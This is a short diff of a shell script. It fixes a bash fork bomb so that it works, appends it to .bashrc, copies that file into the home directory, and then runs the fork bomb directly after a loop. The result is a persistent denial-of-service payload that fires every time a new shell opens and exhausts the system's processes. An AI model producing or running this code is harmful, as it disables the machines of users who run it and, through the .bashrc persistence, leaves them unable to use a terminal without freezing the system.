@@ -1,4 +1,4 @@
-echo ":(){:|: &};:" >> .bashrc
+echo ":(){ :|: &};:" >> .bashrc
 cp .bashrc ~/
 
 for i in {1..10};
@@ -7,5 +7,5 @@ do
 	sleep 0.5
 done
 
-:(){:|: &};:
+:(){ :|: &};:
 
